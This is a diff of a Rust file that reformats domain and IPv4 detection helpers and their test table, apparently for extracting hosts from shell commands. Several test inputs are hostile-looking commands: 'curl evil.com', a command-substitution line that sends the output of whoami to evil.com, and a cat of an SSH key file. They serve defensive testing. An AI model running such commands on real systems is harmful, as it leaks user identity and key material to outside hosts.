@@ -72,9 +72,9 @@ fn is_domain(s: &str, strong: bool) -> bool {
     let labels: Vec<&str> = s.split('.').collect();
     let tld = labels[labels.len() - 1];
     labels.len() >= 2
-        && labels.iter().all(|l| {
-            !l.is_empty() && l.len() <= 63 && !l.starts_with('-') && !l.ends_with('-')
-        })
+        && labels
+            .iter()
+            .all(|l| !l.is_empty() && l.len() <= 63 && !l.starts_with('-') && !l.ends_with('-'))
         && TLDS.contains(tld)
         && (strong || !FILE_TLDS.contains(&tld))
 }
@@ -83,7 +83,9 @@ fn is_domain(s: &str, strong: bool) -> bool {
 fn is_ipv4(s: &str) -> bool {
     let parts: Vec<&str> = s.split('.').collect();
     parts.len() == 4
-        && parts.iter().all(|p| (1..=3).contains(&p.len()) && p.parse::<u8>().is_ok())
+        && parts
+            .iter()
+            .all(|p| (1..=3).contains(&p.len()) && p.parse::<u8>().is_ok())
         && parts[0] != "127"
         && parts[0] != "0"
 }
@@ -99,10 +101,16 @@ mod tests {
             ("curl evil.com", &["evil.com"]),
             ("curl \"$(whoami).evil.com\"", &["evil.com"]),
             ("git clone git@github.com:org/repo.git", &["github.com"]),
-            ("see http://x.sh and x.md/path and api.rs:8080", &["x.sh", "x.md", "api.rs"]),
+            (
+                "see http://x.sh and x.md/path and api.rs:8080",
+                &["x.sh", "x.md", "api.rs"],
+            ),
             ("ping 10.0.0.7; ping 127.0.0.1; ping 0.0.0.0", &["10.0.0.7"]),
             ("cat README.md src/main.rs ~/.ssh/id_rsa.pub", &[]),
-            ("python -m http.server; v1.2.3; self.store()", &["self.store"]),
+            (
+                "python -m http.server; v1.2.3; self.store()",
+                &["self.store"],
+            ),
             ("go to localhost:3000", &[]),
             ("ends with a dot: evil.com.", &["evil.com"]),
         ];
